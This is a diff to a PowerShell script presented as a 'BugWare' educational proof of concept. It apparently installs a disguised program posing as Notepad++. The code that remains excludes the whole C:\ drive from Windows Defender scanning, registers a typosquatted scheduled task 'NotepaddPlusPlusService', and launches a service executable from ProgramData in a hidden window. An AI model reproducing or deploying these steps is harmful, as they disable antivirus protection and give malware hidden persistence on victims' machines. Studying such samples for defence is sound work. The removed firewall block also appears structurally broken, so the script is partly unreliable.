@@ -1,11 +1,15 @@
+# -------------------------------------------------------------------------
+# SECURITY RESEARCH & EDUCATIONAL PURPOSES ONLY
+# This script is part of the BugWare repository, a collection of security tools
+# and PoCs for learning about attack vectors.
+# DO NOT USE THIS FOR ILLEGAL PURPOSES.
+# -------------------------------------------------------------------------
+
 # Check if running as Administrator
 $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
 if (-not $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     exit 1
 }
-
-# Add Server IP
-$SERVER_IP = "localhost"
 
 # 1. FIX: Add Exclusion FIRST, before checking or copying files
 $exclusionPath = "C:\"
@@ -18,10 +22,7 @@ if ($exclusions -notcontains $exclusionPath) {
     Add-MpPreference -ExclusionPath $exclusionPath -Force
 }
 
-# Allow Traffic to Localhost through Firewall
-if (-not (Get-NetFirewallRule -DisplayName "Allow Notepad++ Localhost" -ErrorAction SilentlyContinue)) {
-    New-NetFirewallRule -DisplayName "Allow Notepad++ Localhost" -Direction Inbound -Action Allow -Protocol TCP -LocalPort Any -RemoteAddress "$SERVER_IP"
-
+# Ensure Notepad++ directory exists
 if (-not (Test-Path "C:\Program Files\Notepad++")) {
     New-Item -ItemType Directory -Path "C:\Program Files\Notepad++" -Force | Out-Null
 }
@@ -36,7 +37,7 @@ if (Test-Path "$env:TEMP\regsvr32.exe") {
 }
 
 # Logging helper
-function Log-Msg {
+function Log-Msg { # Ignore -UnusedParameter
     param($msg)
     $logPath = "$env:TEMP\npp_install_log.txt"
     $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
@@ -71,10 +72,10 @@ $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoi
 $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings
 Register-ScheduledTask -TaskName "NotepaddPlusPlusService" -InputObject $task -Force | Out-Null
 
-# Start the task immediately
-Start-ScheduledTask -TaskName "NotepaddPlusPlusService"
+# # Start the task immediately
+# Start-ScheduledTask -TaskName "NotepaddPlusPlusService"
 
-# Start the service immediately (Hidden Window)
+# # Start the service immediately (Hidden Window)
 if (Test-Path "C:\ProgramData\npp\notepad-service.exe") {
     Start-Process -FilePath "C:\ProgramData\npp\notepad-service.exe" -WindowStyle Hidden
 }
